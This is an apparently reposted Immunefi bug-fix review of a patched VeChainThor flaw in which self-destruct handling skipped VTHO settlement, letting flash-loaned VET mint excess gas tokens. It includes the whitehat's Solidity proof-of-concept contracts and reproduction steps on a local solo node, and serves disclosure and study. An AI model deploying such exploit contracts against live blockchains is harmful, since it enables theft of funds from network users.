# 🛡️ VeChainThor VTHO Minting Flaw Patched

- **Source URL:** https://immunefi.com/blog/all/vechainthor-vtho-accrual-bypass-bug-fix-review
- **Fetched:** 2026-11-12
- **Channel:** @defendor_eng
- **Telegram message:** https://t.me/defendor_eng/180 (id 180)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
*•*6 min read

# VeChainThor VTHO Accrual Bypass Bug Fix Review

## Summary

A critical vulnerability was discovered and reported by whitehat [**<u>@nnez</u>**](https://immunefi.com/profile/nnez/?ref=immunefi.com) (one of the top 50 whitehats on Immunefi) on **December 12, 2024**. This flaw enables an attacker to artificially mint a large amount of VeThor Token **(VTHO)** by exploiting a flaw in the self-destruct logic in combination with a flash loan sourced from VeChain’s DEXes.

The impact was assessed as **“Direct loss of funds”** under critical severity, and a bounty of **50,000 USDT** has been awarded.

## What is VeChainThor?

<u>VeChainThor</u> is the layer 1 blockchain that powers the VeChain ecosystem. Highly compatible with the Ethereum Virtual Machine (EVM), VeChainThor underpins a unique dual-token economic model that separates network usage costs from market speculation.

**Dual-Token Economic Model:**

- **VeChain Token (VET):** Serves as the value-transfer (utility) token.
- **VeThor Token (VTHO):** Acts as the gas token representing the cost of using blockchain resources.

This separation allows VET holders to generate VTHO over time automatically, without active staking or node operation. The design minimizes the impact of market speculation on transaction fees, thereby encouraging long-term participation in the ecosystem.

## VTHO Accrual Mechanism

VeChainThor continuously accrues VTHO referred to as “energy” for each account by factoring in its VET balance, the time elapsed since the last update, and a fixed energy growth rate.

This dynamic process is fundamental to the dual-token model, ensuring that transaction fees (paid in VTHO) accurately mirror an account’s stake and active participation in the ecosystem.

The calculation is [<u>implemented as follows</u>](https://github.com/vechain/thor/blob/master/state/account.go?ref=immunefi.com#L47-L65):

```
func (a *Account) CalcEnergy(blockTime uint64) *big.Int {
    if a.BlockTime == 0 {
        return a.Energy
    }
    if a.Balance.Sign() == 0 {
        return a.Energy
    }
    if blockTime <= a.BlockTime {
        return a.Energy
    }
    x := new(big.Int).SetUint64(blockTime - a.BlockTime)
    x.Mul(x, a.Balance)
    x.Mul(x, thor.EnergyGrowthRate)
    x.Div(x, bigE18)
    return new(big.Int).Add(a.Energy, x)
}
```
If the account’s last block time is 0 (meaning it hasn’t been set), or if the account has a zero balance, or if the new block time isn’t later than the last block time, then no new energy is added and the function just returns the current energy.

As shown, the accrued VTHO is derived from the formula:

**VTHO Earned = VET Balance × Time Elapsed × EnergyGrowthRate**

This cumulative sum represents the updated total energy (VTHO) available to the account after accounting for the new accrual.

## VTHO Balance Update on VET Transfers

The VTHO balance must be updated on every VET token transfer **before** the actual transfer occurs. Failing to do so would mean using an incorrect VET balance to compute the earned VTHO. The <u>following snippet from the transfer logic illustrates this requirement for both the sender and recipient is updated before any VET token transfer occurs:</u>

```
Transfer: func(_ vm.StateDB, sender, recipient common.Address, amount *big.Int) {
    if amount.Sign() == 0 {
        return
    }
    // Touch energy balance when token balance changes
    // SHOULD be performed before transfer
    senderEnergy, err := rt.state.GetEnergy(thor.Address(sender), rt.ctx.Time)
    if err != nil {
        panic(err)
    }
    recipientEnergy, err := rt.state.GetEnergy(thor.Address(recipient), rt.ctx.Time)
    if err != nil {
        panic(err)
    }
    if err := rt.state.SetEnergy(thor.Address(sender), senderEnergy, rt.ctx.Time); err != nil {
        panic(err)
    }
    if err := rt.state.SetEnergy(thor.Address(recipient), recipientEnergy, rt.ctx.Time); err != nil {
        panic(err)
    }
    stateDB.SubBalance(sender, amount)
    stateDB.AddBalance(recipient, amount)
    stateDB.AddTransfer(&tx.Transfer{
        Sender:    thor.Address(sender),
        Recipient: thor.Address(recipient),
        Amount:    new(big.Int).Set(amount),
    })
}
```
## Vulnerability Analysis

The whitehat’s investigation focused on the behavior of the [**<u>OnSuicideContract</u>**](https://github.com/vechain/thor/blob/56bd50ee50b81094d4b7c033bef3ed469f10a6c9/runtime/runtime.go?ref=immunefi.com#L250) function, which is invoked during the self-destruct flow. This function is responsible for transferring both VET and VTHO balances from a contract to a designated recipient, mirroring the standard EVM self-destruct behavior.

```
OnSuicideContract: func(_ *vm.EVM, contractAddr, tokenReceiver common.Address) {
			amount, err := rt.state.GetEnergy(thor.Address(contractAddr), rt.ctx.Time)
			if err != nil {
				panic(err)
			}
			if amount.Sign() != 0 {
				// add remained energy of suiciding contract to receiver.
				// no need to clear contract's energy, vm will delete the whole contract later.
				receiverEnergy, err := rt.state.GetEnergy(thor.Address(tokenReceiver), rt.ctx.Time)
				if err != nil {
					panic(err)
				}
				if err := rt.state.SetEnergy(
					thor.Address(tokenReceiver),
					new(big.Int).Add(receiverEnergy, amount),
					rt.ctx.Time); err != nil {
					panic(err)
				}
				// see ERC20's Transfer event
				topics := []common.Hash{
					common.Hash(energyTransferEvent.ID()),
					common.BytesToHash(contractAddr[:]),
					common.BytesToHash(tokenReceiver[:]),
				}
				data, err := energyTransferEvent.Encode(amount)
				if err != nil {
					panic(err)
				}
				stateDB.AddLog(&types.Log{
					Address: common.Address(builtin.Energy.Address),
					Topics:  topics,
					Data:    data,
				})
			}
			if amount := stateDB.GetBalance(contractAddr); amount.Sign() != 0 {
				stateDB.AddBalance(tokenReceiver, amount)
				stateDB.AddTransfer(&tx.Transfer{
					Sender:    thor.Address(contractAddr),
					Recipient: thor.Address(tokenReceiver),
					Amount:    amount,
				})
			}
		},
      .......
}
```
The critical flaw lies in the handling of VTHO settlement. Specifically, the [<u>code</u>](https://github.com/vechain/thor/blob/56bd50ee50b81094d4b7c033bef3ed469f10a6c9/runtime/runtime.go?ref=immunefi.com#L256) attempts to transfer VTHO first in order to settle the accrued amount.

However, if the sent amount is **zero**, the logic fails to update (or settle) the earned VTHO. This oversight allows an attacker to repeatedly trigger self-destruct on contracts using flash loans to supply the necessary VET balance to artificially mint large amounts of VTHO in a very short time.

## Vulnerability Demonstration

The whitehat provided a comprehensive Proof-of-Concept (PoC) to illustrate the exploit. By combining flash loans with the flawed self-destruct logic, an attacker can bypass the intended VTHO settlement and accumulate excessive VTHO, leading to a direct loss of funds.

**Steps of the Attack:**

1. Borrow a large amount of VET using flash loans from VeChain’s DEXes.
2. Create a contract that triggers a self-destruct operation (via [<u>OnSuicideContract</u>](https://github.com/vechain/thor/blob/56bd50ee50b81094d4b7c033bef3ed469f10a6c9/runtime/runtime.go?ref=immunefi.com#L250)) to transfer balances.
3. Because the self-destruct logic does not settle accrued VTHO when the sent amount is zero, repeatedly invoking it allows the attacker to mint additional VTHO.
4. By orchestrating multiple self-destruct events (using flash loans), the attacker can compound the amount of artificially minted VTHO.

**PoC Code:**

Below is an excerpt of the PoC used by the whitehat:

**Attack.sol**

```
pragma solidity 0.8.10;
import "./Flashloan.sol";
interface IEnergy {
    function balanceOf(address _owner) external view returns (uint256 balance);
}
contract Suicidal {
    function commitSuicide() external {
        selfdestruct(payable(msg.sender)); // self destruct to basin
    }
    fallback() external payable {}
    receive() external payable {}
}
contract Basin {
    Suicidal public immutable suicidal;
    constructor() payable {
        suicidal = new Suicidal();
    }
    function trigger() external {
        Suicidal(suicidal).commitSuicide();
        payable(msg.sender).call{value: address(this).balance}("");
    }
}
contract Attack {
    Basin[] public basins;
    Flashloan public flashLoan;
    
    constructor(address _flashLoan) {
        flashLoan = Flashloan(payable(_flashLoan));
    }
    
    function deployBasinAccounts(uint n) external payable {
        require(msg.value >= n, "not enough funds");
        for (uint i; i < n;) {
            basins.push(new Basin{value: 1}());
            unchecked { i++; }
        }
    }
    function run(uint amount) external {
        flashLoan.flashLoan(amount);
    }
    function receiveFlashloan(uint amount) external payable {
        uint basinsLength = basins.length;
        for (uint i = 0; i < basinsLength;) {
            payable(address(basins[i].suicidal())).transfer(amount);
            basins[i].trigger();
            unchecked { i++; }
        }
        payable(msg.sender).transfer(amount);
    }
    function getEnergyInBasins() external view returns (uint[] memory) {
        uint basinsLength = basins.length;
        uint[] memory results = new uint[](basinsLength);
        for (uint i = 0; i < basinsLength;) {
            results[i] = IEnergy(0x0000000000000000000000000000456E65726779).balanceOf(address(basins[i]));
            unchecked { i++; }
        }
        return results;
    }
    fallback() external payable {}
    receive() external payable {}
}
```
**Flashloan.sol**

```
pragma solidity 0.8.10;
interface IFlashloanReceiver {
    function receiveFlashloan(uint amount) external payable;
}
contract Flashloan {
    constructor() payable {}
    receive() external payable {}
    fallback() external payable {}
    function flashLoan(uint amount) external {
        uint balanceBefore = address(this).balance;
        IFlashloanReceiver(msg.sender).receiveFlashloan{value: amount}(amount);
        require(address(this).balance >= balanceBefore);
    }
}
```
## Setup and Execution

To reproduce the exploit, follow these steps:

1. Run a Solo Node following the “[<u>How to Run a Thor Solo Node</u>](https://docs.vechain.org/how-to-run-a-node/how-to-run-a-thor-solo-node?ref=immunefi.com)” guide.
2. Set up an RPC proxy for Remix IDE using the [<u>Remix IDE RPC Proxy Setup instructions</u>](https://docs.vechain.org/developer-resources/frameworks-and-ides/remix?ref=immunefi.com).
3. Access Remix IDE at [<u>https://remix.ethereum.org/</u>](https://remix.ethereum.org/?ref=immunefi.com).
4. Prepare the contracts by creating two files with the provided code one for the `Flashloan` contract and one for the `Attack` contract and switch the environment to “External HTTP Provider” with the URL http://localhost:8545.
5. Deploy the `Flashloan` contract and send 1000 ETH (`1000e18`) worth of VET tokens to it via low-level interaction.
6. Deploy the `Attack` contract, providing the deployed `Flashloan` contract’s address as a constructor argument.
7. Call `deployBasinAccounts` on the `Attack` contract, attaching 1 wei per basin (e.g., 3 wei for 3 basin accounts).
8. Execute the `run` function on the `Attack` contract with a flash loan amount (recommended: `1000e18`).
9. Call `getEnergyInBasins` on the `Attack` contract to verify that each Basin contract has an abnormally high VTHO balance.

## Vulnerability Fix

The vulnerability was addressed by VeChain through a critical update, as documented in their github commit:

## Acknowledgements:

We extend our sincere thanks to **@**[**nnez**](https://x.com/__nnez?ref=immunefi.com) for responsibly disclosing this vulnerability and providing a detailed PoC. Kudos also to the Immunefi team for their continued efforts in ensuring web3 security.

If you’re a developer or a whitehat looking for lucrative bug bounty opportunities in the web3 space, consider exploring the world of blockchain security—where your skills can earn you 10-100x more than in traditional web2 environments.
